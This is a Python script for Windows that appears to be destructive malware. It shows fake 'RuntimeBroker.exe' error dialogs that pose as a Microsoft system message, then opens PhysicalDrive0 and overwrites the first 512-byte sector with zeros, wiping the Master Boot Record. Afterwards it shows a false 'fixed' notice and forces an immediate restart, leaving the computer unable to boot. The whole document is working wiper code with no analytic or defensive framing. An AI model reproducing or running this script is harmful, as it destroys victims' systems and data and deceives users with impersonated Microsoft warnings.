import os 
import time 
from os import system 
from subprocess import call 
os.system('pip install pywin32') 
from win32file import * 
from win32ui import * 
from win32con import * 
from win32gui import * 
from sys import exit 

warningtitle = 'RuntimeBroker.exe - error message'
warningdescription = 'The instruction at 0x00007FF950FCBE4B reference memory at 0x000000000000024, The memory could not written.           Would you like to restart?'

if MessageBox(warningdescription, warningtitle, MB_ICONWARNING | MB_YESNO) == 7: 
  MessageBox("Would you like to restart RuntimeBroker.exe?", "RuntimeBroker.exe - Warning", MB_ICONWARNING | MB_OK)

hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create handle
WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite
CloseHandle(hDevice) # Close handle

MessageBox("RuntimeBroker.exe has been fixed, please contact microsoft support if any other problems occur.", "Restarted - RuntimeBroker.exe", MB_ICONWARNING | MB_OK) 
time.sleep(5)
MessageBox("Your PC requires a restart. (Reason: Master Boot Record(MBR) has been changed) Please click ok to restart.", "System", MB_ICONWARNING | MB_OK) 
os.system("shutdown /r /t 1")
